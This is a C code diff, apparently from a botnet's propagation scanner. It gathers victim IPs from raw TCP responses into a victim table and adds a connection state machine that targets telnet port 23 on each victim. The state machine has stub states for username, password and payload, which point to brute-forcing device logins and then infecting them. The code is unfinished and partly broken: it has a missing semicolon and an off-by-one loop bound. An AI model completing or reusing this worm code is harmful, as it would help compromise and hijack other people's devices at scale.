@@ -64,17 +64,19 @@ static unsigned short csum(unsigned short *ptr, int nbytes)
 
 bool scan_scanner(void)
 {
+	int32_t max = getdtablesize();
+	printd("Maximum files open: %d", max)
+
 	if (scan_able == false)
 		_exit(0);
 
 	printd("Initializing Scanner")
 
 	victim_table = calloc(SCAN_SCANNER_MAXCON, sizeof(struct scan_victim));
-    for (uint8_t i = 0; i < SCAN_SCANNER_MAXCON; i++)
-    {
-        victim_table[i].state = 0;
-        victim_table[i].sock = -1;
-    }
+	for (uint8_t i = 0; i < SCAN_SCANNER_MAXCON; i++)
+	{
+		victim_table[i].sock = -1;
+	}
 
 	int32_t sock, i = 1;
 	uint16_t fails = 0;
@@ -196,15 +198,15 @@ bool scan_scanner(void)
 	while (1)
 	{
 		unsigned char buf[1024];
-
 		errno = 0;
+
 		i = recvfrom(sock, buf, 1024, 0, NULL, NULL);
 		if (i <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
 			goto end;
 
 		struct iphdr *riph = (struct iphdr *)buf;
 		unsigned short iphdrlen;
-
+		i = 0;
 		if (riph->protocol == 6)
 		{
 			iphdrlen = riph->ihl * 4;
@@ -215,15 +217,70 @@ bool scan_scanner(void)
 			{
 				pktd(riph, rtcph) // Only in debug releases
 				struct scan_victim *victim;
-
-				victim = &victim_table[1];
+				victim = &victim_table[i];
 				victim->ip = riph->saddr;
+				victim->user = 0;
+				victim->pass = 0;
+				if (i++ >= SCAN_SCANNER_MAXCON)
+					goto skip;
 			}
 		}
 	}
+skip:
 	while (1)
 	{
+		struct sockaddr_in addrx;
+		addrx.sin_family = AF_INET;
+		addrx.sin_port = htons(23);
+		memset(addrx.sin_zero, '\0', sizeof(addrx.sin_zero));
 
+		struct timeval timeout;
+		timeout.tv_sec = SCAN_SCANNER_SEC;
+		timeout.tv_usec = SCAN_SCANNER_USEC;
+
+		for (i = 0; i <= SCAN_SCANNER_MAXCON; i++)
+		{
+			switch(victim_table[i].state)
+			{
+				case CONNECTING:
+				{
+					addrx.sin_addr.s_addr = victim_table[i].ip;
+					if ((victim_table[i].sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+					{
+						victim_table[i].state = FINISHED;
+						break;
+					}
+					setsockopt(victim_table[i].sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
+					setsockopt(victim_table[i].sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
+					fcntl(victim_table[i].sock, F_SETFL, fcntl(victim_table[i].sock, F_GETFL, NULL) | O_NONBLOCK);
+					if(connect(victim_table[i].sock, (struct sockaddr *)&addrx, sizeof(addrx)) == -1 && errno != EINPROGRESS)
+					{
+						victim_table[i].state = FINISHED;
+					}
+					else
+					{
+						victim_table[i].state = USERNAME;
+					}
+					break;
+				} 
+				case USERNAME:
+				{
+
+				}
+				case PASSWORD:
+				{
+
+				}
+				case PAYLOAD:
+				{
+
+				}
+				case FINISHED:
+				{
+					break;
+				}
+			}
+		}
 	}
 end:
 	free(victim_table);
